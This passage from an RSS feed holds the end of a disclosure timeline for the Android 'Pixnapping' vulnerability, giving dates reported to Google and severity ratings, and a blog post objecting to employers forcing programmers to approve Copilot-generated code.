      </p></div>
      <div>
        <p>September 11, 2025</p><p>
        Google rated our workaround as <b>High Severity</b>
      </p></div>
      <div>
        <p>September 8, 2025</p><p>
        We disclosed our workaround to Google
      </p></div>
      <div>
        <p>September 4, 2025</p><p>
        We became aware of the patch and later discovered a workaround to re-enable <b>Pixnapping</b>
      </p></div>
      
      
      <div>
        <p>May 5, 2025</p><p>
        Google rated our <b>app list bypass</b> as <b>Low Severity</b> and resolved the report as <b>Won't Fix (Infeasible)</b>
      </p></div>
      <div>
        <p>April 23, 2025</p><p>
        We separately disclosed our <b>app list bypass</b> vulnerability (Section 3.1 of <a href="https://www.pixnapping.com/assets/pixnapping.pdf">the paper</a>) to Google
      </p></div>
      <div>
        <p>April 14, 2025</p><p>
        Google rated <b>Pixnapping</b> as <b>High Severity</b>
      </p></div>
      <div>
        <p>February 24, 2025</p><p>
        We disclosed <b>Pixnapping</b> to Google
      </p></div>
    </div>


      </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I am a programmer, not a rubber-stamp that approves Copilot generated code (216 pts)]]></title>
            <link>https://prahladyeri.github.io/blog/2025/10/i-am-a-programmer.html</link>
            <guid>45588283</guid>
            <pubDate>Wed, 15 Oct 2025 05:09:44 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://prahladyeri.github.io/blog/2025/10/i-am-a-programmer.html">https://prahladyeri.github.io/blog/2025/10/i-am-a-programmer.html</a>, See on <a href="https://news.ycombinator.com/item?id=45588283">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
	<!-- Post header-->
	<header>
		<!-- Post title-->
		
		<!-- Post meta content-->
		<p>Posted on 15 Oct 2025</p>
	</header>
	<!-- Preview image figure-->
	<!-- <figure class="mb-4"><img class="img-fluid rounded" src="https://dummyimage.com/900x400/ced4da/6c757d.jpg" alt="..." /></figure> -->
	<!-- Post content-->
	<section>
		<p>Today morning, I came across this reddit post titled <a href="https://www.reddit.com/r/cscareerquestions/comments/1o6vjv0/completely_losing_interest_in_the_career_due_to/">Completely losing interest in the career due to AI and AI-pilled people</a>. They describe how in a span of just two months, their corporate job went from <code>"I'll be here for life"</code> to <code>"Time to switch careers?"</code>. And this post isn’t alone, there is a deep and dark pattern to it.</p>

<p>When CTOs or project managers suggest programmers in their team to use AI assistance from copilot, chatgpt or other LLMs to improve productivity, it’s totally understandable. But once it’s no longer voluntary but is enforced as a policy, you start entering sinister territory. Worse, said usage is actually getting monitored and performance appraisals have now started depending on the AI usage instead of (or at least in addition to) traditional metrics like number of priority bugs raised, code reviews, Function Points Analysis, etc.</p>

<p>If they’re really so confident on the LLM’s effectiveness, why not just keep it voluntary, why force it on people? The results will be there in the outcome of the shipped product for all to see. By forcing LLM usage upon programmers for implementation of every tiny little thing, are they trying to make us dependent on LLMs to such extent that programmers will be reduced to mere approvers of LLM generated code in the new scheme of things; mere rubber stamps, if you will, who just label the commits and annotate the tags as a formality?</p>

<p>Needless to say, they’d still want you to take the responsibility. If bugs or tickets get raised on the shipped code, it’s <strong>you</strong> who gets fired, not the copilot or chatgpt - though the larger narrative or news headlines next day would still be, “AI is eating jobs”!</p>

<p>If the essence of programming shifts from creating to merely approving, we risk losing not just a profession, but a craft. What do you think is going on here, let me know your thoughts in comments.</p>

	</section>
		<!-- Post tags-->
		<label>tagged under: </label>
		  
			
			<a href="https://prahladyeri.github.io/tag/programming">programming</a>
		  
</article></div>]]></description>
        </item>
    </channel>
</rss>